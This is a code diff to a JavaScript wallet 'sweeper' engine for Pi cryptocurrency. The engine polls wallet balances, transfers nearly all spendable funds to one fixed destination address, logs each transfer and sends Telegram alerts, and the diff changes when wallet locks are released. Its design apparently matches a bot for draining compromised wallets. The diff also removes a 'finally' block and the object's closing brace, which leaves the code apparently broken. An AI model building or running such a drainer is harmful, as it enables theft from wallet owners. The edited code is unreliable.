@@ -113,6 +113,7 @@ const SweeperEngine = {
       const evalResult = await this.evaluateBalance(pubKey);
 
       if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
+        walletLocks.delete(id); // release lock if no funds
         return { status: 'NO_SWEEPABLE_FUNDS' };
       }
 
@@ -122,6 +123,7 @@ const SweeperEngine = {
         if (evalResult.spendable >= wallet.customAmount) {
           targetAmount = wallet.customAmount;
         } else {
+          walletLocks.delete(id);
           return { status: 'BELOW_FIXED_TARGET' };
         }
       } else {
@@ -130,11 +132,13 @@ const SweeperEngine = {
         } else if (evalResult.spendable > 0.02) {
           targetAmount = evalResult.spendable - 0.02;
         } else {
+          walletLocks.delete(id);
           return { status: 'BELOW_THRESHOLD' };
         }
       }
 
       if (targetAmount <= 0) {
+        walletLocks.delete(id);
         return { status: 'POOL_EXHAUSTED' };
       }
 
@@ -170,19 +174,21 @@ const SweeperEngine = {
       if (success) {
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: String(sweptAmount), transaction_hash: txHash, status: 'SUCCESS', created_at: now });
         await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP SUCCESSFUL!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Balance: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
+        
+        // Keep the lock active for 10 seconds to allow the blockchain ledger to update its balance
+        setTimeout(() => walletLocks.delete(id), 10000);
         return { status: 'SUCCESS' };
       } else {
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: '0', status: 'FAILED', error_details: errorReason, created_at: now });
         await notifyTelegram(bot, chatTarget, `⚠️ <b>SWEEP FAILURE</b>\n📦 Box: #${wallet.id}\n❌ Error: <code>${errorReason}</code>`);
+        walletLocks.delete(id);
         return { status: 'FAILED' };
       }
     } catch (criticalError) {
       log('ERROR', `Loop Failure on Box #${id}`, criticalError.message);
-    } finally {
       walletLocks.delete(id);
     }
   }
-};
 
 function startSweeperEngine(db, bot) {
   if (monitorRunning) return;
